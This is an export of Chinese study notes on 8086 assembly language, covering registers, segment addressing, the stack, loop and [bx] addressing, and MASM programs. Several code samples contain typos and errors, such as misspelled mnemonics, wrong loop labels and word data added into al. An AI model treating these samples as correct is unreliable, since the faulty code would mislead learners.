PC工作过程的简单描述：\n\n从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n\nIP&#x3D;IP+所读取指令的长度，从而指向下一条指令；\n\n执行指令。转到1，重复这个过程。\n\n\n11. 修改CS,IP的指令在CPU中，程序员能够用指令读写的部件只有寄存器，程序员可以通过改变寄存器中的内容实现对CPU的控制。\nCPU从何处执行指令是由CS,IP中的内容决定的，程序员可以通过改变CS,IP中的内容来控制CPU执行目标指令。\nmov指令可以改变8086 CPU大部分寄存器的值，被称为传送指令。\nmov指令不能用于设置CS,IP的值，8086 CPU没有提供这样的功能。8086 CPU为CS,IP提供了另外的指令来改变它们的值：转移指令。\n# 同时修改CS,IP的内容：\njmp 段地址：偏移地址\n# 功能：用指令中给出的段地址修改CS，偏移地址修改IP。\n\n#仅修改IP的内容：\njmp 某一合法寄存器\n# 功能：用寄存器中的值修改IP。\n\n12. 代码段对于8086 PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。\n\n段地址在8086 CPU的寄存器中存放。当8086 CPU要访问内存时，由段寄存器提供内存单元的段地址。8086 CPU有4个段寄存器，其中CS用来存放指令的段地址。\n\nCS存放指令的段地址，IP存放指令的偏移地址。\n\n\n8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。\n\n8086 CPU的工作过程：\n\n· 从CS:IP指向内存单元读取指令，读取的指令进入指令缓冲器；\n· IP指向下一条指令；\n· 执行指令。（转到开头，重复这个过程）\n\n4.8086 CPU提供转移指令jmp修改CS,IP的内容。\n13. debug功能用Debug的r命令查看，改变CPU寄存器的内容；用Debug的d命令查看内存中的内容；用Debug的e命令改写内存中的内容；用Debug的u命令将内存中的机器指令翻译成汇编指令；用Debug的t命令执行一条机器指令；用Debug的a命令以汇编指令的格式在内存中写入一条机器指令；\n记忆：true ad （真 广告）\n二、寄存器（内存访问）1. 内存中字的存储任何两个地址连续的内存单元，N号单元和N+1号单元，可以将它们看成两个内存单元，也可以看成一个地址为N的子单元中的高位字节单元和低位字节单元。\n2. DS和[address]CPU要读取一个内存单元的时候，必须先给出这个内存单元的地址；在8086 PC中，内存地址由段地址和偏移地址组成；8086 CPU中有一个DS寄存器，通常用来存放要访问的数据的段地址。\n&#x2F;&#x2F; 读取10000H单元的内容:\nmov bx,1000H\nmov ds,bx\nmov al,[0]      &#x2F;&#x2F; mov [0],al\n&#x2F;&#x2F; 将10000H（1000:0）中的数据读到al中。\n\n\n&#x2F;&#x2F; mov指令可完成的两种传送功能：\n&#x2F;&#x2F; 1.将数据直接送入寄存器；\n&#x2F;&#x2F; 2.将一个寄存器中的内容送入另一个寄存器中;\n&#x2F;&#x2F; 除此之外，mov指令还可以将一个内存单元中的内容送入一个寄存器。\n\n&#x2F;&#x2F;mov ds,1000H是非法的。\n\n执行指令时，8086CPU自动取DS中的数据为内存单元的段地址。\n数据-&gt;通用寄存器-&gt;段寄存器\n3. 字的传送因为8086CPU是16位结构，有16根数据线，所以，可以一次性传送16位数据，也就是一次性传送一个字。\nmov bx,1000H\nmov ds,bx\nmov ax[0]   ;1000:0处的字型数据送入ax\nmvo[0],cx   ;cx中的16位数据送到1000:0处\n\n4. mov、add、sub指令&#x2F;&#x2F; 已学mov指令的几种形式：\nmov 寄存器，数据\nmov 寄存器，寄存器\nmov 寄存器，内存单元\nmov 内存单元，寄存器\n\n&#x2F;&#x2F;add和sub指令同mov一样，都有两个操作对象。\n\nmov 段寄存器，寄存器\n\n5. 数据段我们可以将一组长度为N（N &lt;&#x3D; 64k）、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段。\n· 参考一：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov al,0        ;用al存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[1]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[2]      ;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n注意：一个字型数据占两个单元，所以偏移地址是0、2、4\n· 参考二：\nmov ax,123BH\nmov ds,ax       ;将123BH送入ds中，作为数据段的段地址\nmov ax,0        ;用ax存放累加结果\nadd al,[0]      ;将数据段第一个单元（偏移地址为0）中的数值加到al中\nadd al,[2]      ;将数据段第二个单元（偏移地址为1）中的数值加到al中\nadd al,[4]      ;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n部分小结\n\n字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在地地址单元中，高位字节存放在高地址单元中。\n用mov指令要访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中。\n[address]表示一个偏移地址为address的内存单元。\n在内存和寄存器之间传送字符数据时，高地址单元和高8位寄存器、低地址单元和低8位寄存器相对应。\nmov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。\n可以根据自己的推测，在Debug中实验指令的新格式。\n\n6. 栈栈是一种具有特殊的访问方式的存储空间。它的特殊性在于，最后进入这个空间的数据，最先出去。\n栈有两个基本的操作：入栈和出栈。\n入栈：将一个新的元素放到栈顶。\n出栈：从栈顶去除一个元素。\n\n栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。\n栈的操作规则：LIFO（Last In First Out， 后进先出）\n7. CPU提供的栈机制\n8086CPU提供入栈和出栈指令：（最基本的）PUSH（入栈）POP（出栈）\n\npush ax：将寄存器ax中的数据送入栈中；pop ax：从栈顶取出数据送入ax。\n8086CPU的入栈和出栈操作都是以字为单位进行的。\nmov ax,0123H\npush ax\nmov bx,2266H\npush bx\nmov cx 1122H\npush cx\npop ax      ;ax&#x3D;1122H\npop bx      ;bx&#x3D;2266H\npop cx      ;cx&#x3D;0123H\n\n两个疑问：\n1.CPU如何知道当前要执行的指令所在的位置？\n答:寄存器CS和IP中存放着当前指令的段地址和偏移地址。\n\n8086CPU中，有两个寄存器：\n段寄存器SS  存放栈顶的段地址\n寄存器SP    存放栈顶的偏移地址\n\n数据-&gt;通用寄存器-&gt;段寄存器\n\n任意时刻，SS:SP指向栈顶元素。\n\n2.执行push和pop的时候，如何知道哪个单元是栈顶单元？\n\npush ax\n· SP&#x3D;SP-2;\n· 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。\n\npop ax\n· 将SS:SP指向的内存单元处的数据送入ax中；\n· SP&#x3D;SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。\n\n注意：出栈后，SS:SP指向新的栈顶，pop操作前的栈顶元素依然存在，但已不在栈中；\n    再次执行push等入栈指令后，会写入新的数据，它将被覆盖。\n\n\n\n任意时刻，SS:SP指向栈顶元素，\n当栈为空的时候，栈中没有元素，也就不存在栈顶元素；\n所以SS:SP只能指向栈的最底部单元下面的单元，\n该单元的偏移地址为栈最底部的字单元的偏移地址+2；\n栈最底部字单元的地址为1000：000E，所以栈空时，SP&#x3D;0010H；\n\n8. 栈顶超界的问题当栈满的时候再使用push指令入栈，栈空的时候再使用pop指令出栈，都将发生栈顶超界问题。\n\n\n\n\n\n\n\n\n\n栈顶超界是危险的。\n9. push、pop指令push和pop指令是可以在寄存器和内存之间传送数据的。\n&lt;!--栈与内存--&gt;\n栈空间当然也是内存空间的一部分，\n它只是一段可以以一种特殊的方式进行访问的内存空间。\n\npush 寄存器：将一个寄存器中的数据入栈；\npop 寄存器：出栈，用一个寄存器接收出栈的数据；\n\npush 段寄存器：将一个段寄存器中的数据入栈；\npop 段寄存器：出栈，用一个段寄存器接收出栈的数据；\n\npush 内存单元：将一个内存单元处的字入栈（栈操作都是以字为单位）；\npop 内存单元：出栈，用一个内存字单元接受出栈的数据；\n例如：\npush[0]\npop[2]\n&lt;!--指令执行时，CPU要知道内存单元的地址，\n可以在push、pop指令中给出内存单元的偏移地址，\n段地址在指令执行时，CPU从 ds 中取得。--&gt;\n\n结论：push、pop实质上就是一种内存传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS:SP指出的。同时，push和pop指令还要改变SP中的内容。\n执行push时：先改变SP，后向SS:SP处传送；执行pop时：先读取SS:SP处的数据，后改变SP；\n注意：push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH。\n提示：SS、SP只是栈顶；改变SP后写内存的入栈指令；读内存后改变SP的出栈指令。\n这就是8086CPU提供的栈操作机制。\n10. 栈段我们可以将长度为N（ N &lt;&#x3D; 64K ）的一组 地址连续、起始地址为16的倍数的内存单元，当作栈来用，从而定义了一个栈段。\n任意时刻，SS:SP指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元的地址为1000:FFFE，多以栈空时，SP&#x3D;0000H。\nmov ax,1000H\nmov ss,ax\nmov sp,0020H\nmov ax,cs\nmov ds,ax\nmov ax,[0]\nadd ax,[2]\nmov bx,[4]\nadd bx,[6]\npush ax\npush bx\npop ax\npop bx\n\n一段内存，可以既是代码的存储空间，又是数据的存储空间，还可以是栈空间，也可以什么也不是。关键在于CPU中寄存器的设置，即：CS,IP,SS,SP,DS的指向。\n","slug":"01","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"2872e18edcfe70db45537a6abab5f8bb","title":"8086汇编学习笔记_02","content":"汇编语言程序1. 一个源程序从写出到执行的过程&#x2F;&#x2F; 简要过程：\n编写 -&gt; 编译链接 -&gt; 执行\n\n\n执行可执行文件中的程序：操作系统按照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如：设置CS:IP指向第一条要执行的指令），然后由CPU执行程序。\n\n2. 源程序assume cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21h\ncodesg ends\nend\n\n\n汇编指令\n\n有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。\n\n\n伪指令\n\n没有对应的机器码的指令，最终不被CPU所执行。\n伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n\n\n\n&#x2F;&#x2F; 定义一个段\nsegment和ends是一对成对使用的伪指令，\n这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令。\nsegment和ends的功能时定义一个段，\nsegment说明一个段开始，ends说明一个段结束。\n\n一个段必须有一个名称来标识，使用格式为：\n段名 segment\n段名 ends\n\n一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间来使用。\n\n一个有意义的汇编程序中至少要有一个短，这个段用来存放代码。\n\n&#x2F;&#x2F; 真正的结束\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，\n如果碰到了伪指令的end，就结束对源程序的编译。\n\n如果程序写完了，要在结尾处加上伪指令end。\n否则编译器在编译程序时，无法知道程序在何处结束。\n\n切记：不要搞混了end和ends。\n\n&#x2F;&#x2F; 寄存器与段的关联假设\nassume：含义为&quot;假设&quot;；\n它假设某一段寄存器和程序中的某一个用segment···ends定义的段相关联。\n通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n\n&#x2F;&#x2F; 源程序中的“程序”\n\n汇编源程序：\n伪指令（编译器处理）\n汇编语言（编译为机器码）\n\n程序：源程序中最终由计算机执行、处理的指令或数据。\n\n&#x2F;&#x2F; 标号\n一个标号指代了一个地址；\n\ncodesg:放在segment的前面，作为一个段的名称，\n这个段的名称最终将被编译、链接程序处理为一个段的段地址。\n\n&#x2F;&#x2F; 程序返回\n应该在程序的末尾添加返回的程序段。\nmov ax,4c00H\nint 21H\n&#x2F;&#x2F; 这两条指令所实现的功能就是程序返回。\n\n\n&#x2F;&#x2F; 语法错误和逻辑错误\n语法错误，程序在编译时被编译器发现的错误，容易发现；\n逻辑错误，程序在编译时不能表现出来的、在运行时发生的错误；\n\n3. 编辑源程序assume cs:abc\n\nabc segment\n    mov ax,2\n    add ax,ax\n    add ax,ax\n\n    mov ax,4c00H\n    int 21H\nabc ends\n\nend\n\n 一般来说，有两类错误使我们得不到所期望的目标文件：\n\n我们程序中有“Server Errors”；\n找不到所给出的源程序文件；\n\n4. 以简化的方式进行编译和链接&#x2F;&#x2F; 对源程序进行编译连接：\n使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件【.obj文件】\n再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的可执行文件【.EXE文件】\n\n例：\nmasm 1.asm;\nlink 1.obj\n或\nml 1.asm\n\n关于编译和链接链接的作用：\n\n当源程序很大时，可以将它分为多个源程序文件来编译，每个源程序编译成为目标文件后，再用链接程序将它们链接到一起，生成一个可执行文件；\n程序中调用了某个库文件中的子程序，需要将这个库文件和该程序生成的目标文件链接到一起，生成一个可执行文件；\n一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息；\n所以在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件；\n\n5. 可执行文件中的程序装入内存并运行的原理1. 在 DOS 中，可执行文件中的程序 P1 若要运行，必须有一个正在运行的程序 P2，\n将 P1 从可执行文件中加载入内存，将 CP U的控制权交给P1，P1 才能得以运行；\n\n2. 当 P1 运行完毕后，应该将 CPU 的控制权交还给使他得以运行的程序；\n\n3. 操作系统的外壳：\n（1）操作系统是由多个功能模块组成的庞大、复杂的软件系统，任何通用的操作系统，\n都需要提供一个称为 shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统工作；\n（2）DOS 中有一个程序 command.com，这个程序在 DOS 中称为命令解释器，也就是 DOS 系统的 shell；\n \n4. 执行可执行文件 1.exe 时，\n（1）什么程序将 CPU 的控制权交给了 1.exe？\n（2）将程序 1.exe 加载入内存后，如何使程序得以运行？\n（3）1.exe 程序运行结束后，返回到了哪里？\n答：\n（1）在 DOS 中直接执行 1.exe 时，是正在运行的 cmd.exe 将 1.exe 中的程序加载入内存；\n（2）cmd.exe 设置 CPU 的 CS:IP 指向程序的第一条指令（即，程序的入口），从而使程序得以运行；\n（3）程序运行结束后，返回 cmd.exe 中，CPU 继续运行 cmd.exe；\n\n\n6. 程序执行过程的跟踪assume cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21H\ncodesg ends\n\nend start\n\nEXE文件中的程序的加载过程\n\n程序加载后，ds 中存放着程序所在内存区的段地址，这个内存区的偏移地址为 0 ，则程序所在的内存区的地址为：ds:0；\n\n这个内存区的前256个字节中存放的是 PSP，dos 用来和程序进行通信；\n\n从 256 字节处向后的空间存放的是程序；\n\n所以，我们从 ds 中可以得到 PSP 的段地址 SA，PSP 的偏移地址为 0，则物理地址为 SA×16+0；\n\n因为 PSP 占 256（100H）字节，所以程序的物理地址是：SA×16+0+256&#x3D; SA×16+16×16&#x3D;（SA+16）×16+0，可用段地址和偏移地址表示为：SA+10:0；\n\n\n","slug":"02","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"27759c8c14f50cd48e39f238bf5dbaa8","title":"8086汇编学习笔记_04","content":"包含多个段的程序1. 在代码段中使用数据dw 的含义是定义字型数据。\n因为dw定义的数据处于代码段的最开始，所以偏移地址为0。\nassume cs:codesg\ncodesg segment\n    dw 0123h,0456h,0789h,0abc,0def,0fedh,0cbah,0987h\nstart:  mov bx,0\n        mov ax,0\n        mov cx,8\n    s:  add ax,cs:[bx]\n        add bx,2\n        loop s\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n2. 在代码段中使用栈完成下面的程序，利用栈，将程序中定义的数据逆序存放。\nassume cs:codesg\ncodesg segment\n    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n    dw 0,0,0,0,0,0,0,0\n\nstart:  mov ax,cs\n        mov ss,ax\n        mov sp,32\n        mov bx,0\n        mov cx,8\n    s:  push cs:[bx]\n        add bx,2\n        loop s\n\n        mov bx,0\n        mov cx,8\n    s0: pop cs:[bx]\n        add bx,2\n        loop s0\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n3. 将数据，代码，栈放入不同的段我们用和定义代码段一样的方法来定义多个段，然后在这些段里面定义需要的数据，或通过定义数据来取得栈空间。\nassume cs:code,ds:data,ss:stack\ndata segment\n    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\ndata ends\n\nstack segment\n    dw 0,0,0,0,0,0,0,0\nstack ends\n\ncode segment\nstart:  mov ax,stack\n        mov ss,ax\n        mov sp,16\n        mov ax,data\n        mov ds,ax\n        mov bx,0\n        mov cx,8\n    s:  push [bx]\n        add bx,2\n        loop s\n\n        mov bx,0\n        mov cx,8\n    s:  pop [bx]\n        add bx,2\n        loop s0\n\n        mov ax,4c00h\n        int 21h\ncode ends\n\nend start\n\n更灵活定位内存地址1. and和or指令and指令：逻辑与指令，按位进行与运算。通过该指令可将操作对象的相应位设为0，其他位不变。\nor指令：逻辑或指令，按位进行或运算。通过该指令可将操作对象的相应位设为1，其他位不变。\n2. 关于ASCII吗assume ds:data\ndata segment\n    db &#39;unIX&#39;\n    db &#39;foRK&#39;\n    data ends\n\ncode segment\n    start:  mov al,&#39;a&#39;\n            mov bl,&#39;b&#39;\n            mov ax,4c00h\n            int 21h\ncode ends\n\nend start\n\n3. 大小写转换的问题要改变一个字母大小，实质就是改变它所对应的ascii码，小写字母的ascii码值比大写字母的ascii码值大20H。\n一个字母，我们不管它原来是大写还是小写：我们将它的第5位置0，它就必将变为大写字母；将它的第5位置1，它就必将变为小写字母。\n要将一个字母的第5位设置为0，可以使用按位与（AND）操作。\n将变量的值与一个掩码进行按位与操作，使第5位为0，其他位保持不变。\n掩码为 0xDF（二进制：11011111）。\n\n例如，如果变量的值是 &#39;a&#39;，其ASCII码为 97（二进制：01100001），\n与掩码按位与之后，变量的值变为 65（二进制：01000001），即大写字母 &#39;A&#39;。\n\n要将一个字母的第5位设置为1，可以使用按位或（OR）操作。\n将变量的值与一个掩码进行按位或操作，使第5位为1，其他位保持不变。\n掩码为 0x20（二进制：00100000）。\n\n例如，如果变量的值是 &#39;A&#39;，其ASCII码为 65（二进制：01000001），\n与掩码按位或之后，变量的值变为 97（二进制：01100001），即小写字母 &#39;a&#39;。\n\n4. [bx+idata][bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata (bx中的数值加上idata)\n指令mov ax,[bx+200]也可以写成如下格式(常用):\nmov ax,[200+bx]\nmov ax,200[bx]\nmov ax,[bx].200\n\n5. 用[bx+idata]的方式进行数组的处理[bx+idata]的方式为高级语言实现数组提供了便利机制。\nchar a[5] &#x3D; &quot;BaSiC&quot;;\nchar b[5] &#x3D; &quot;minIX&quot;;\nmain()\n&#123;\n    int i;\n    i &#x3D; 0;\n    do\n    &#123;\n        a[i] &#x3D; a[i] &amp; 0xDF;\n        b[i] &#x3D; b[i] | 0x20;\n        i++;\n    &#125; while(i &lt; 5);\n&#125;\n\n6. SI和DISI和DI是8086CPU中和bx功能相近的寄存器，SI和DI不能够分成两个8位寄存器来使用。\n&#x2F;&#x2F; 下面的三组指令实现了相同的功能：\nmov bx,0\nmov ax,[bx]\n\nmov si,0\nmov ax,[si]\n\nmov di,0\nmov ax,[di]\n\n&#x2F;&#x2F; 下面的三组指令实现了相同的功能：\nmov bx,0\nmov ax,[bx+123]\n\nmov si,0\nmov ax,[si+123]\n\nmov di,0\nmov ax,[di+123]\n\n7. [bx+si]和[bx+di][bx+si]表示一个内存单元，它的偏移地址位(bx)+(si)。即bx中的数值加上si中的数值。\n指令 mov ax,[bx+si] 的含义：将一个内存单元的内容送入ax，这个内存单元的长度为2字节（字单元），存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中。\n指令mov ax,[bx+si]的数学化的描述为：\n（ax）&#x3D;（（ds）* 16 +（bx）+（si））\n\n该指令也可以写成如下格式（常用）：\nmov ax,[bx][si]\n\n8. [bx+si+idata]和[bx+di+idata][bx+si+idata]和[bx+si+idata]的含义相似。\n指令mov ax，[bx+si+idata]的含义：将一个内存单元的内容送入ax，这个内存单元的长度为2字节（字单论），存放一个字，偏移地址为bx中的数值加上si中的数值再加上idata，段地址在ds中。\n数学化的描述为：\n(ax)&#x3D;( (ds)*16+(bx)+(si)+idata )\n\n9. 不同的寻址方式的灵活应用\n[idata]用一个常量来表示地址，可用于直接定位一个内存单元；\n[bx]用一个变量来表示内存地址，可以用于间接定位一个内存单元；\n[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元；\n[bx+si]用两个变量表示地址；\n[bx+si+idata]用两个变量和一个常量表示地址。\n\n&#x2F;&#x2F; 编程，将datasg段中每个单词的头一个字母改为大写字母。\nassume cs:codesg,ds:datasg\ndatasg segment\n    db &#39;1. file         &#39;\n    db &#39;2. edit         &#39;\n    db &#39;3. serch        &#39;\n    db &#39;4. view         &#39;\n    db &#39;5. options      &#39;\n    db &#39;6. help         &#39;\ndatasg ends\n\ncodesg segment\nstart:  mov ax,datasg\n        mov ds,ax\n        mov bx,0\n\n        mov cx,6\n    s:  mov al,[bx+3]\n        and al,11011111b\n        mov [bx+3],al\n        add bx,16\n        loop s\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\nsi,cx,ax,bx显然不能用来暂存cx中的值，因为这些寄存器在循环中也要时使用；cs，ip，ds也不能用，因为cs:ip时刻指向当前指令，ds指向datasg段；可用的就只有：dx,di,es,ss,sp,bp等6个寄存器了。\n这些数据可能是寄存器中的，也可能是内存中的。\n我们可以用寄存器暂存它们，但是这不是一个一般化的解决方案，因为寄存器的数量有限，每个程序中可使用的寄存器都不一样。\nassume cs:codesg,ds:datasg\n\ndatasg segment\n    db &#39;ibm.............&#39;\n    db &#39;dec.............&#39;\n    db &#39;dos.............&#39;\n    db &#39;vax.............&#39;\n    dw 0        ;定义一个字，用来保存cx\ndatasg ends\n\ncodesg segment\nstart:  mov ax,datasg\n        mov ds,ax\n\n        mov bx,0\n\n        mov cx,4\ns0:     mov ds:[40H],cx     ;将外层循环的cx值保存在datasg:40H单元中\n        mov si,0\n        mov cx,4            ;cx设置为内存循环的次数\ns:      mov al,[bx+si]\n        and al,11011111b\n        mov [bx+si],al\n        inc si\n        loop s\n\n        add bx,16\n        mov cx,ds:[40H]     ;用datasg:40H单元中的值恢复cx\n        loop s0             ;外层循环的loop指令将cx中的计数值减1\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n一般来说，在需要暂存数据的时候，我们应该使用栈。\nassume cs:codesg,ds:datasg\n\ndatasg segment\n    db &#39;ibm.............&#39;\n    db &#39;dec.............&#39;\n    db &#39;dos.............&#39;\n    db &#39;vax.............&#39;\ndatasg ends\n\nstacksg segment             ;定义一个段，用来作栈段，容量为16字节\n    dw 0,0,0,0,0,0,0,0\nstacksg ends\n\ncodesg segment\nstart:  mov ax,stacksg\n        mov ss,ax\n        mov sp,16\n        mov ax,datasg\n        mov ds,ax\n\n        mov bx,0\n\n        mov cx,4\ns0:     push cx             ;将外层循环的cx值压栈\n        mov si,0\n        mov cx,4            ;cx设置为内存循环的次数\ns:      mov al,[bx+si]\n        and al,11011111b\n        mov [bx+si],al\n        inc si\n        loop s\n\n        add bx,16\n        pop cx              ;从栈顶淡出原cx的值，恢复cx\n        loop s0             ;外层循环的loop指令将cx中的计数值减1\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n","slug":"04","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"aa3313a82f9ba24855cce6bcccfff26c","title":"8086汇编学习笔记_03","content":"bx和loop指令1. [bx]和内存单元的描述assume cs:codesg\n\ncodesg segment\n\nfishcc:     mov ax, 2000H\n            mov ds, ax\n            mov al, [0]\n            mov bl, [1]\n            mov cl, [2]\n            mov dl, [3]\n\n            mov ax, 4C00H\n            int 21H\n\ncodesg ends\n\nend fishcc\n\n[bx]和[0]有些类似，[0]表示内存单元，它的偏移地址是0.mov ax,[0]mov al,[0]\n我们要完整地描述一个内存单元，需要两种信息：\n\n内存单元的地址；\n内存单元的长度（类型）。\n\n我们用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认在ds中，单元的长度（类型）可以由具体指令中的其他操作对象（比如说寄存器）指出，如前面的AX,AL。\n[bx]同样也表示一个内存单元，它的偏移地址在bx中，比如下面的指令:\n\nmov ax [bx]\nmov al [bx]\n\n2. loop指令英文单词”loop”有循环的含义，显然这个指令和循环有关。\n指令的格式是：loop 标号，CPU执行loop指令的时候，要执行两步操作：\n\n(cx)&#x3D;(cx)-1；\n判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。\n\n通常，我们用loop指令来实现循环功能，cx中存放循环次数。\n编程计算2^12\n\n程序代码：\nassume cs:code\n\ncode segment\n\nstart:  mov ax,2\n    mov cx,11\ns:  add ax,ax\n    loop s\n\n    mov ax,4c00H\n    int 21H\n\ncode ends\n\nend start\n\n\n在cx中从存放循环次数；\nloop指令中的标号所识别地址要在前面；\n要循环执行的程序段，要写在标号和loop指令的中间。\n\n&lt;!-- 描述性符号&quot;()&quot; --&gt;\n1. ax中的内容为0010H，我们可以这样来描述：(ax)&#x3D;0010H；\n2. 2000:1000处的内容为0010H，我们可以这样来描述：(21000H)&#x3D;0010H；\n3. 对于mov ax,[2]的功能，我们可以这样来描述：(ax)&#x3D;((ds)*16+2)；\n4. 对于mov [2],ax的功能，我们可以这样来描述：((ds)*16+2)&#x3D;(ax)；\n5. 对于add ax,2的功能，我们可以这样来描述：(ax)&#x3D;(ax)+2；\n6. 对于add ax,bx的功能，我们可以这样来描述：(ax)&#x3D;(ax)+(bx)；\n7. 对于push ax的功能，我们可以这样来描述：\n(sp)&#x3D;(sp)-2\n((ss)*16+(sp))&#x3D;(ax)\n1. 对于pop的功能，我们可以这样来描述:\n(ax)&#x3D;((ss)*16+(sp))\n(sp)&#x3D;(sp)+2\n\n&lt;!-- 约定符号idata表示常量 --&gt;\n我们在Debug中写过类似的指令：mov ax,[0]，表示将ds:0处的数据送入ax中。\n指令中，在&quot;[...]&quot;里用一个常量0表示内存单元的偏移地址。\n以后，我们用idata表示常量。\n\n例如：\nmov ax,[idata]就代表mov ax,[1]、mov ax,[2]、mov ax,[3]等。\nmov bx,idata就代表mov bx,1、mov bx,2、mov bx,3等。\nmov ds,idata就代表mov ds,1、mov ds,2等，它们都是非法指令。\n\n在汇编源程序中，数据不能以字母开头，所以要在前面加0。\n3. [bx]mov ax,[bx]功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中。即：(ax)&#x3D;((ds)*16+(bx))；\nmov [bx],ax功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。即：((ds)*16+(bx))&#x3D;(ax)\n[bx]的作用：作为偏移地址与DS配合\n4. Debug和汇编编译器Masm对指令的不同处理在Debug中，mov ax,[0]表示将ds:0处的数据送入al中。但是在汇编源程序中，指令”mov ax,[0]”被编译器当作指令”mov ax,0”处理。\n字节单元送入字节单元中。\n\n在MASM中，mov ax,[2]是解释为mov ax,2的。一般我们是通过BX来代替，我们可以先mov bx,2，在通过mov ax,[bx]来实现。当然也可以向DEBUG一样直接用[2]，不过要加上段地址，例如 mov ax,段地址:[2]。\n&#x2F;&#x2F; 对比以下指令分类：\nmov al,[0] \nmov al,ds:[0]\nmov al,[bx]\nmov al,ds:[bx]\n\nloop和[bx]的联合应用类型的匹配和结果的不超界\n6. 段前缀指令”mov ax,[bx]”中，内存单元的偏移地址由bx给出，而段地址默认在ds中。我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器。这些出现在访问内存单元的指令中，用于显式地指明内存单元的段地址的”ds:”,”cs:”,”ss:”或”es:”，在汇编语言中称为段前缀。\n7. 一段安全的空间在8086模式中，随意向一段内存空间写入内容是很危险的，因为这段空间可能从存放着重要的系统数据或代码。\n在一般的PC机中，DOS方式下，DOS和其他合法的程序一般都不会使用0:200 ~ 0:2FF (0:200h ~ 0:2FFh) 的256个字节的空间。所以，我们使用这段空间是安全的。\n8. 段前缀的应用&#x2F;&#x2F; 效率不高\nassume cs:code\ncode segment\n    mov bx,0\n    mov cx,12\ns:  mov ax,0ffffh\n    mov ds,as\n    mov dl,[bx]\n    mov ax,0020h\n    mov ds,ax\n    inc bx\n    loop s\n\n    mov ax,4c00h\n    int 21h\ncode ends\nend\n\n&#x2F;&#x2F; 改进代码\nassume cs:code\ncode segment\n    mov ax,0ffffh\n    mov ds,ax\n    mov ax,0020h\n    mov es,ax\n    mov bx,0\n    mov cx,12\ns:  mov dl,[bx]\n    mov es:[bx],dl\n    inc bx\n    loop s\n\n    mov ax,4c00h\n    int 21h\ncode ends\nend\n","slug":"03","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"02e063a90486ef4cde640d9e32f1b93d","title":"8086汇编学习笔记_05","content":"数据处理的两个基本问题用reg表示一个寄存器，用sreg表示一个段寄存器。\nreg的集合包括：ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di;\nsreg的集合包括：ds,ss,cs,es；\n1. 